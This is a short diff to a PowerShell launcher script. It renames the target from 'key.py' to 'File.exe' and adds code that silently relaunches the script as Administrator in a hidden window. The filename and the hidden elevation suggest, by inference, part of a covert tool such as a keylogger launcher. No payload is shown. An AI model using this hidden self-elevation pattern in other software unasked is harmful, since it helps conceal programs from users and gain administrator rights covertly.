@@ -2,7 +2,13 @@
 # You will also need to compile file as .exe
 
 # Set the file name as your .exe
-$strFileName = "key.py"
+$strFileName = "File.exe"
+
+If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-WindowStyle Hidden -noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+    exit
+}
 
 $strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
 Set-Location -Path $strDirScriptPath
